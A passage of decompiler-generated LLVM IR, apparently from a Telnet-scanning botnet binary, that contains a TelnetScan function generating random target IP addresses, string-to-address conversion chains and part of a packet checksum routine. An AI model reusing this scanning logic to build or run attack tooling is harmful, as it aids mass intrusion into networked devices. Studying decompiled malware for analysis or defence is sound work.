dec_label_pc_100082cc:                            ; preds = %dec_label_pc_100082c0
  %v2_100082cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100082e0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100082e0 = zext i8 %v3_100082e0 to i32
  %v4_10008310 = call i32 @szprintf(i32 %v2_100082cc, i32 ptrtoint ([13 x i8]* @global_var_10018954.296 to i32), i32 %v4_100082e0)
  br label %dec_label_pc_10008314

dec_label_pc_10008314:                            ; preds = %dec_label_pc_100082c0, %dec_label_pc_100082cc
  %v3_10008318 = icmp eq i32 %v2_10003594, 236
  br i1 %v3_10008318, label %dec_label_pc_10008320, label %dec_label_pc_10008368

dec_label_pc_10008320:                            ; preds = %dec_label_pc_10008314
  %v2_10008320 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008334 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008334 = zext i8 %v3_10008334 to i32
  %v4_10008364 = call i32 @szprintf(i32 %v2_10008320, i32 ptrtoint ([13 x i8]* @global_var_10018964.297 to i32), i32 %v4_10008334)
  br label %dec_label_pc_10008368

dec_label_pc_10008368:                            ; preds = %dec_label_pc_10008314, %dec_label_pc_10008320
  %v3_1000836c = icmp eq i32 %v2_10003594, 237
  br i1 %v3_1000836c, label %dec_label_pc_10008374, label %dec_label_pc_100083bc

dec_label_pc_10008374:                            ; preds = %dec_label_pc_10008368
  %v2_10008374 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008388 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008388 = zext i8 %v3_10008388 to i32
  %v4_100083b8 = call i32 @szprintf(i32 %v2_10008374, i32 ptrtoint ([13 x i8]* @global_var_10018974.298 to i32), i32 %v4_10008388)
  br label %dec_label_pc_100083bc

dec_label_pc_100083bc:                            ; preds = %dec_label_pc_10008368, %dec_label_pc_10008374
  %v3_100083c0 = icmp eq i32 %v2_10003594, 238
  br i1 %v3_100083c0, label %dec_label_pc_100083c8, label %dec_label_pc_10008410

dec_label_pc_100083c8:                            ; preds = %dec_label_pc_100083bc
  %v2_100083c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100083dc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100083dc = zext i8 %v3_100083dc to i32
  %v4_1000840c = call i32 @szprintf(i32 %v2_100083c8, i32 ptrtoint ([13 x i8]* @global_var_10018984.299 to i32), i32 %v4_100083dc)
  br label %dec_label_pc_10008410

dec_label_pc_10008410:                            ; preds = %dec_label_pc_100083bc, %dec_label_pc_100083c8
  %v3_10008414 = icmp eq i32 %v2_10003594, 239
  br i1 %v3_10008414, label %dec_label_pc_1000841c, label %dec_label_pc_10008464

dec_label_pc_1000841c:                            ; preds = %dec_label_pc_10008410
  %v2_1000841c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008430 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008430 = zext i8 %v3_10008430 to i32
  %v4_10008460 = call i32 @szprintf(i32 %v2_1000841c, i32 ptrtoint ([13 x i8]* @global_var_10018994.300 to i32), i32 %v4_10008430)
  br label %dec_label_pc_10008464

dec_label_pc_10008464:                            ; preds = %dec_label_pc_10008410, %dec_label_pc_1000841c
  %v3_10008468 = icmp eq i32 %v2_10003594, 240
  br i1 %v3_10008468, label %dec_label_pc_10008470, label %dec_label_pc_100084b8

dec_label_pc_10008470:                            ; preds = %dec_label_pc_10008464
  %v2_10008470 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008484 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008484 = zext i8 %v3_10008484 to i32
  %v4_100084b4 = call i32 @szprintf(i32 %v2_10008470, i32 ptrtoint ([13 x i8]* @global_var_100189a4.301 to i32), i32 %v4_10008484)
  br label %dec_label_pc_100084b8

dec_label_pc_100084b8:                            ; preds = %dec_label_pc_10008464, %dec_label_pc_10008470
  %v3_100084bc = icmp eq i32 %v2_10003594, 241
  br i1 %v3_100084bc, label %dec_label_pc_100084c4, label %dec_label_pc_1000850c

dec_label_pc_100084c4:                            ; preds = %dec_label_pc_100084b8
  %v2_100084c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100084d8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100084d8 = zext i8 %v3_100084d8 to i32
  %v4_10008508 = call i32 @szprintf(i32 %v2_100084c4, i32 ptrtoint ([14 x i8]* @global_var_100189b4.302 to i32), i32 %v4_100084d8)
  br label %dec_label_pc_1000850c

dec_label_pc_1000850c:                            ; preds = %dec_label_pc_100084b8, %dec_label_pc_100084c4
  %v3_10008510 = icmp eq i32 %v2_10003594, 242
  br i1 %v3_10008510, label %dec_label_pc_10008518, label %dec_label_pc_10008560

dec_label_pc_10008518:                            ; preds = %dec_label_pc_1000850c
  %v2_10008518 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000852c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000852c = zext i8 %v3_1000852c to i32
  %v4_1000855c = call i32 @szprintf(i32 %v2_10008518, i32 ptrtoint ([13 x i8]* @global_var_100189c4.303 to i32), i32 %v4_1000852c)
  br label %dec_label_pc_10008560

dec_label_pc_10008560:                            ; preds = %dec_label_pc_1000850c, %dec_label_pc_10008518
  %v3_10008564 = icmp eq i32 %v2_10003594, 243
  br i1 %v3_10008564, label %dec_label_pc_1000856c, label %dec_label_pc_100085b4

dec_label_pc_1000856c:                            ; preds = %dec_label_pc_10008560
  %v2_1000856c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008580 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008580 = zext i8 %v3_10008580 to i32
  %v4_100085b0 = call i32 @szprintf(i32 %v2_1000856c, i32 ptrtoint ([13 x i8]* @global_var_100189d4.304 to i32), i32 %v4_10008580)
  br label %dec_label_pc_100085b4

dec_label_pc_100085b4:                            ; preds = %dec_label_pc_10008560, %dec_label_pc_1000856c
  %v3_100085b8 = icmp eq i32 %v2_10003594, 244
  br i1 %v3_100085b8, label %dec_label_pc_100085c0, label %dec_label_pc_10008608

dec_label_pc_100085c0:                            ; preds = %dec_label_pc_100085b4
  %v2_100085c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100085d4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100085d4 = zext i8 %v3_100085d4 to i32
  %v4_10008604 = call i32 @szprintf(i32 %v2_100085c0, i32 ptrtoint ([13 x i8]* @global_var_100189e4.305 to i32), i32 %v4_100085d4)
  br label %dec_label_pc_10008608

dec_label_pc_10008608:                            ; preds = %dec_label_pc_100085b4, %dec_label_pc_100085c0
  %v3_1000860c = icmp eq i32 %v2_10003594, 245
  br i1 %v3_1000860c, label %dec_label_pc_10008614, label %dec_label_pc_1000865c

dec_label_pc_10008614:                            ; preds = %dec_label_pc_10008608
  %v2_10008614 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10008628 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10008628 = zext i8 %v3_10008628 to i32
  %v4_10008658 = call i32 @szprintf(i32 %v2_10008614, i32 ptrtoint ([13 x i8]* @global_var_100189f4.306 to i32), i32 %v4_10008628)
  br label %dec_label_pc_1000865c

dec_label_pc_1000865c:                            ; preds = %dec_label_pc_10008608, %dec_label_pc_10008614
  %v3_10008660 = icmp eq i32 %v2_10003594, 246
  %v2_10008668 = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_10008660, label %dec_label_pc_10008668, label %dec_label_pc_100086b0

dec_label_pc_10008668:                            ; preds = %dec_label_pc_1000865c
  %v3_1000867c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000867c = zext i8 %v3_1000867c to i32
  %v4_100086ac = call i32 @szprintf(i32 %v2_10008668, i32 ptrtoint ([13 x i8]* @global_var_10018a04.307 to i32), i32 %v4_1000867c)
  br label %dec_label_pc_100086b0

dec_label_pc_100086b0:                            ; preds = %dec_label_pc_1000865c, %dec_label_pc_10008668
  br i1 false, label %dec_label_pc_100086bc, label %dec_label_pc_10008704

dec_label_pc_100086bc:                            ; preds = %dec_label_pc_100086b0
  br label %dec_label_pc_10008704

dec_label_pc_10008704:                            ; preds = %dec_label_pc_100086b0, %dec_label_pc_100086bc
  store i32 268470032, i32* @lr, align 4
  %v1_1000870c = call i32 @inet_addr(i32 %v2_10008668)
  ret i32 %v1_1000870c

; uselistorder directives
  uselistorder i8* @global_var_1002b914.61, { 1, 0 }
  uselistorder i8* @global_var_1002b913.60, { 248, 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10008704, { 1, 0 }
  uselistorder label %dec_label_pc_100086b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000865c, { 1, 0 }
  uselistorder label %dec_label_pc_10008608, { 1, 0 }
  uselistorder label %dec_label_pc_100085b4, { 1, 0 }
  uselistorder label %dec_label_pc_10008560, { 1, 0 }
  uselistorder label %dec_label_pc_1000850c, { 1, 0 }
  uselistorder label %dec_label_pc_100084b8, { 1, 0 }
  uselistorder label %dec_label_pc_10008464, { 1, 0 }
  uselistorder label %dec_label_pc_10008410, { 1, 0 }
  uselistorder label %dec_label_pc_100083bc, { 1, 0 }
  uselistorder label %dec_label_pc_10008368, { 1, 0 }
  uselistorder label %dec_label_pc_10008314, { 1, 0 }
  uselistorder label %dec_label_pc_100082c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000826c, { 1, 0 }
  uselistorder label %dec_label_pc_10008218, { 1, 0 }
  uselistorder label %dec_label_pc_100081c4, { 1, 0 }
  uselistorder label %dec_label_pc_10008170, { 1, 0 }
  uselistorder label %dec_label_pc_1000811c, { 1, 0 }
  uselistorder label %dec_label_pc_100080c8, { 1, 0 }
  uselistorder label %dec_label_pc_10008074, { 1, 0 }
  uselistorder label %dec_label_pc_10008020, { 1, 0 }
  uselistorder label %dec_label_pc_10007fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10007f78, { 1, 0 }
  uselistorder label %dec_label_pc_10007f24, { 1, 0 }
  uselistorder label %dec_label_pc_10007ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10007e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10007e28, { 1, 0 }
  uselistorder label %dec_label_pc_10007dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10007d80, { 1, 0 }
  uselistorder label %dec_label_pc_10007d2c, { 1, 0 }
  uselistorder label %dec_label_pc_10007cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10007c84, { 1, 0 }
  uselistorder label %dec_label_pc_10007c30, { 1, 0 }
  uselistorder label %dec_label_pc_10007bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10007b88, { 1, 0 }
  uselistorder label %dec_label_pc_10007b34, { 1, 0 }
  uselistorder label %dec_label_pc_10007ae0, { 1, 0 }
  uselistorder label %dec_label_pc_10007a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10007a38, { 1, 0 }
  uselistorder label %dec_label_pc_100079e4, { 1, 0 }
  uselistorder label %dec_label_pc_10007990, { 1, 0 }
  uselistorder label %dec_label_pc_1000793c, { 1, 0 }
  uselistorder label %dec_label_pc_100078e8, { 1, 0 }
  uselistorder label %dec_label_pc_10007894, { 1, 0 }
  uselistorder label %dec_label_pc_10007840, { 1, 0 }
  uselistorder label %dec_label_pc_100077ec, { 1, 0 }
  uselistorder label %dec_label_pc_10007798, { 1, 0 }
  uselistorder label %dec_label_pc_10007744, { 1, 0 }
  uselistorder label %dec_label_pc_100076f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000769c, { 1, 0 }
  uselistorder label %dec_label_pc_10007648, { 1, 0 }
  uselistorder label %dec_label_pc_100075f4, { 1, 0 }
  uselistorder label %dec_label_pc_100075a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000754c, { 1, 0 }
  uselistorder label %dec_label_pc_100074f8, { 1, 0 }
  uselistorder label %dec_label_pc_100074a4, { 1, 0 }
  uselistorder label %dec_label_pc_10007450, { 1, 0 }
  uselistorder label %dec_label_pc_100073fc, { 1, 0 }
  uselistorder label %dec_label_pc_100073a8, { 1, 0 }
  uselistorder label %dec_label_pc_10007354, { 1, 0 }
  uselistorder label %dec_label_pc_10007300, { 1, 0 }
  uselistorder label %dec_label_pc_100072ac, { 1, 0 }
  uselistorder label %dec_label_pc_10007258, { 1, 0 }
  uselistorder label %dec_label_pc_10007204, { 1, 0 }
  uselistorder label %dec_label_pc_100071b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000715c, { 1, 0 }
  uselistorder label %dec_label_pc_10007108, { 1, 0 }
  uselistorder label %dec_label_pc_100070b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007060, { 1, 0 }
  uselistorder label %dec_label_pc_1000700c, { 1, 0 }
  uselistorder label %dec_label_pc_10006fb8, { 1, 0 }
  uselistorder label %dec_label_pc_10006f64, { 1, 0 }
  uselistorder label %dec_label_pc_10006f10, { 1, 0 }
  uselistorder label %dec_label_pc_10006ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10006e68, { 1, 0 }
  uselistorder label %dec_label_pc_10006e14, { 1, 0 }
  uselistorder label %dec_label_pc_10006dc0, { 1, 0 }
  uselistorder label %dec_label_pc_10006d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d18, { 1, 0 }
  uselistorder label %dec_label_pc_10006cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10006c70, { 1, 0 }
  uselistorder label %dec_label_pc_10006c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10006bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10006b74, { 1, 0 }
  uselistorder label %dec_label_pc_10006b20, { 1, 0 }
  uselistorder label %dec_label_pc_10006acc, { 1, 0 }
  uselistorder label %dec_label_pc_10006a78, { 1, 0 }
  uselistorder label %dec_label_pc_10006a24, { 1, 0 }
  uselistorder label %dec_label_pc_100069d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000697c, { 1, 0 }
  uselistorder label %dec_label_pc_10006928, { 1, 0 }
  uselistorder label %dec_label_pc_100068d4, { 1, 0 }
  uselistorder label %dec_label_pc_10006880, { 1, 0 }
  uselistorder label %dec_label_pc_1000682c, { 1, 0 }
  uselistorder label %dec_label_pc_100067d8, { 1, 0 }
  uselistorder label %dec_label_pc_10006784, { 1, 0 }
  uselistorder label %dec_label_pc_10006730, { 1, 0 }
  uselistorder label %dec_label_pc_100066dc, { 1, 0 }
  uselistorder label %dec_label_pc_10006688, { 1, 0 }
  uselistorder label %dec_label_pc_10006634, { 1, 0 }
  uselistorder label %dec_label_pc_100065e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000658c, { 1, 0 }
  uselistorder label %dec_label_pc_10006538, { 1, 0 }
  uselistorder label %dec_label_pc_100064e4, { 1, 0 }
  uselistorder label %dec_label_pc_10006490, { 1, 0 }
  uselistorder label %dec_label_pc_1000643c, { 1, 0 }
  uselistorder label %dec_label_pc_100063e8, { 1, 0 }
  uselistorder label %dec_label_pc_10006394, { 1, 0 }
  uselistorder label %dec_label_pc_10006340, { 1, 0 }
  uselistorder label %dec_label_pc_100062ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006298, { 1, 0 }
  uselistorder label %dec_label_pc_10006244, { 1, 0 }
  uselistorder label %dec_label_pc_100061f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000619c, { 1, 0 }
  uselistorder label %dec_label_pc_10006148, { 1, 0 }
  uselistorder label %dec_label_pc_100060f4, { 1, 0 }
  uselistorder label %dec_label_pc_100060a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000604c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10005fa4, { 1, 0 }
  uselistorder label %dec_label_pc_10005f50, { 1, 0 }
  uselistorder label %dec_label_pc_10005efc, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10005e54, { 1, 0 }
  uselistorder label %dec_label_pc_10005e00, { 1, 0 }
  uselistorder label %dec_label_pc_10005dac, { 1, 0 }
  uselistorder label %dec_label_pc_10005d58, { 1, 0 }
  uselistorder label %dec_label_pc_10005d04, { 1, 0 }
  uselistorder label %dec_label_pc_10005cb0, { 1, 0 }
  uselistorder label %dec_label_pc_10005c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10005c08, { 1, 0 }
  uselistorder label %dec_label_pc_10005bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10005b60, { 1, 0 }
  uselistorder label %dec_label_pc_10005b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ab8, { 1, 0 }
  uselistorder label %dec_label_pc_10005a64, { 1, 0 }
  uselistorder label %dec_label_pc_10005a10, { 1, 0 }
  uselistorder label %dec_label_pc_100059bc, { 1, 0 }
  uselistorder label %dec_label_pc_10005968, { 1, 0 }
  uselistorder label %dec_label_pc_10005914, { 1, 0 }
  uselistorder label %dec_label_pc_100058c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000586c, { 1, 0 }
  uselistorder label %dec_label_pc_10005818, { 1, 0 }
  uselistorder label %dec_label_pc_100057c4, { 1, 0 }
  uselistorder label %dec_label_pc_10005770, { 1, 0 }
  uselistorder label %dec_label_pc_1000571c, { 1, 0 }
  uselistorder label %dec_label_pc_100056c8, { 1, 0 }
  uselistorder label %dec_label_pc_10005674, { 1, 0 }
  uselistorder label %dec_label_pc_10005620, { 1, 0 }
  uselistorder label %dec_label_pc_100055cc, { 1, 0 }
  uselistorder label %dec_label_pc_10005578, { 1, 0 }
  uselistorder label %dec_label_pc_10005524, { 1, 0 }
  uselistorder label %dec_label_pc_100054d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000547c, { 1, 0 }
  uselistorder label %dec_label_pc_10005428, { 1, 0 }
  uselistorder label %dec_label_pc_100053d4, { 1, 0 }
  uselistorder label %dec_label_pc_10005380, { 1, 0 }
  uselistorder label %dec_label_pc_1000532c, { 1, 0 }
  uselistorder label %dec_label_pc_100052d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005284, { 1, 0 }
  uselistorder label %dec_label_pc_10005230, { 1, 0 }
  uselistorder label %dec_label_pc_100051dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005188, { 1, 0 }
  uselistorder label %dec_label_pc_10005134, { 1, 0 }
  uselistorder label %dec_label_pc_100050e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000508c, { 1, 0 }
  uselistorder label %dec_label_pc_10005038, { 1, 0 }
  uselistorder label %dec_label_pc_10004fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10004f90, { 1, 0 }
  uselistorder label %dec_label_pc_10004f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10004e94, { 1, 0 }
  uselistorder label %dec_label_pc_10004e40, { 1, 0 }
  uselistorder label %dec_label_pc_10004dec, { 1, 0 }
  uselistorder label %dec_label_pc_10004d98, { 1, 0 }
  uselistorder label %dec_label_pc_10004d44, { 1, 0 }
  uselistorder label %dec_label_pc_10004cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10004c9c, { 1, 0 }
  uselistorder label %dec_label_pc_10004c48, { 1, 0 }
  uselistorder label %dec_label_pc_10004bf4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10004b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10004af8, { 1, 0 }
  uselistorder label %dec_label_pc_10004aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10004a50, { 1, 0 }
  uselistorder label %dec_label_pc_100049fc, { 1, 0 }
  uselistorder label %dec_label_pc_100049a8, { 1, 0 }
  uselistorder label %dec_label_pc_10004954, { 1, 0 }
  uselistorder label %dec_label_pc_10004900, { 1, 0 }
  uselistorder label %dec_label_pc_100048ac, { 1, 0 }
  uselistorder label %dec_label_pc_10004858, { 1, 0 }
  uselistorder label %dec_label_pc_10004804, { 1, 0 }
  uselistorder label %dec_label_pc_100047b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000475c, { 1, 0 }
  uselistorder label %dec_label_pc_10004708, { 1, 0 }
  uselistorder label %dec_label_pc_100046b4, { 1, 0 }
  uselistorder label %dec_label_pc_10004660, { 1, 0 }
  uselistorder label %dec_label_pc_1000460c, { 1, 0 }
  uselistorder label %dec_label_pc_100045b8, { 1, 0 }
  uselistorder label %dec_label_pc_10004564, { 1, 0 }
  uselistorder label %dec_label_pc_10004510, { 1, 0 }
  uselistorder label %dec_label_pc_100044bc, { 1, 0 }
  uselistorder label %dec_label_pc_10004468, { 1, 0 }
  uselistorder label %dec_label_pc_10004414, { 1, 0 }
  uselistorder label %dec_label_pc_100043c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000436c, { 1, 0 }
  uselistorder label %dec_label_pc_10004318, { 1, 0 }
  uselistorder label %dec_label_pc_100042c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004270, { 1, 0 }
  uselistorder label %dec_label_pc_1000421c, { 1, 0 }
  uselistorder label %dec_label_pc_100041c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004174, { 1, 0 }
  uselistorder label %dec_label_pc_10004120, { 1, 0 }
  uselistorder label %dec_label_pc_100040cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004078, { 1, 0 }
  uselistorder label %dec_label_pc_10004024, { 1, 0 }
  uselistorder label %dec_label_pc_10003fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10003f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10003f28, { 1, 0 }
  uselistorder label %dec_label_pc_10003ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10003e80, { 1, 0 }
  uselistorder label %dec_label_pc_10003e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10003d84, { 1, 0 }
  uselistorder label %dec_label_pc_10003d30, { 1, 0 }
  uselistorder label %dec_label_pc_10003cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10003c88, { 1, 0 }
  uselistorder label %dec_label_pc_10003c34, { 1, 0 }
  uselistorder label %dec_label_pc_10003be0, { 1, 0 }
  uselistorder label %dec_label_pc_10003b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003b38, { 1, 0 }
  uselistorder label %dec_label_pc_10003ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10003a90, { 1, 0 }
  uselistorder label %dec_label_pc_10003a3c, { 1, 0 }
  uselistorder label %dec_label_pc_100039e8, { 1, 0 }
  uselistorder label %dec_label_pc_10003994, { 1, 0 }
  uselistorder label %dec_label_pc_10003940, { 1, 0 }
  uselistorder label %dec_label_pc_100038ec, { 1, 0 }
  uselistorder label %dec_label_pc_10003898, { 1, 0 }
  uselistorder label %dec_label_pc_10003844, { 1, 0 }
  uselistorder label %dec_label_pc_100037f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000379c, { 1, 0 }
  uselistorder label %dec_label_pc_10003748, { 1, 0 }
  uselistorder label %dec_label_pc_100036f4, { 1, 0 }
  uselistorder label %dec_label_pc_100036a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000364c, { 1, 0 }
  uselistorder label %dec_label_pc_100035f8, { 1, 0 }
}

define i32 @TelnetScan(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000874c = load i32, i32* @global_var_1002b920.309, align 4
  store i32 %v3_1000874c, i32* @r3, align 4
  %v2_10008754 = call i32 @ntohl(i32 %v3_1000874c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10008760 = and i32 %v2_10008754, %arg1
  %v0_10008768 = call i32 @rand_cmwc()
  %v1_10008774 = sub i32 -1, %arg1
  %v2_10008778 = and i32 %v0_10008768, %v1_10008774
  %v2_10008780 = xor i32 %v2_10008778, %v2_10008760
  ret i32 %v2_10008780
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_1()
  %v2_100088103 = icmp sgt i32 %arg2, 1
  br i1 %v2_100088103, label %dec_label_pc_100087c8, label %dec_label_pc_10008818

dec_label_pc_100087c8:                            ; preds = %entry, %dec_label_pc_100087c8
  %stack_var_-24.08 = phi i16* [ %v5_100087fc, %dec_label_pc_100087c8 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10008804, %dec_label_pc_100087c8 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_100087e8, %dec_label_pc_100087c8 ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_100087e4, %dec_label_pc_100087c8 ], [ 0, %entry ]
  %v4_100087c8 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_100087cc = load i16, i16* %stack_var_-24.08, align 2
  %v3_100087cc = zext i16 %v2_100087cc to i32
  %v2_100087e4 = add i32 %v3_100087cc, %stack_var_-12.05
  %v3_100087e4 = icmp ult i32 %v2_100087e4, %stack_var_-12.05
  %v4_100087e8 = zext i1 %v3_100087e4 to i32
  %v5_100087e8 = add i32 %v4_100087e8, %stack_var_-16.06
  %v1_100087f8 = add i32 %v4_100087c8, 2
  %v5_100087fc = inttoptr i32 %v1_100087f8 to i16*
  %v1_10008804 = add nsw i32 %stack_var_-20.07, -2
  %v2_10008810 = icmp sgt i32 %v1_10008804, 1
  br i1 %v2_10008810, label %dec_label_pc_100087c8, label %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge

dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge: ; preds = %dec_label_pc_100087c8
  %v3_10008810.le = icmp eq i32 %v1_10008804, 1
  br i1 %v3_10008810.le, label %dec_label_pc_10008824, label %dec_label_pc_10008890.preheader

dec_label_pc_10008818:                            ; preds = %entry
  %v3_100088104 = icmp eq i32 %arg2, 1
  br i1 %v3_100088104, label %dec_label_pc_10008824, label %dec_label_pc_10008890.preheader

dec_label_pc_10008824:                            ; preds = %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge, %dec_label_pc_10008818
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_100087fc, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ %arg1, %dec_label_pc_10008818 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_100087e8, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_100087e4, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ]
  %v1_10008828 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_10008828 = load i8, i8* %v1_10008828, align 1
  %v3_10008828 = zext i8 %v2_10008828 to i32
  %v2_10008840 = add i32 %v3_10008828, %stack_var_-12.0.lcssa18
  %v3_10008840 = icmp ult i32 %v2_10008840, %stack_var_-12.0.lcssa18
  %v4_10008844 = zext i1 %v3_10008840 to i32
  %v5_10008844 = add i32 %v4_10008844, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10008890.preheader

dec_label_pc_10008890.preheader:                  ; preds = %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge, %dec_label_pc_10008824, %dec_label_pc_10008818
  %stack_var_-12.1.ph = phi i32 [ %v2_100087e4, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ], [ %v2_10008840, %dec_label_pc_10008824 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100087e8, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ], [ %v5_10008844, %dec_label_pc_10008824 ]
  %v1_1000889429 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_1000889c30 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100088a031 = or i32 %v1_1000889429, %v1_1000889c30
  %v1_100088a832 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_100088b033 = or i32 %v2_100088a031, %v1_100088a832
  %v3_100088b434 = icmp eq i32 %v2_100088b033, 0
  br i1 %v3_100088b434, label %dec_label_pc_100088bc, label %dec_label_pc_10008854

dec_label_pc_10008854:                            ; preds = %dec_label_pc_10008890.preheader, %dec_label_pc_10008854
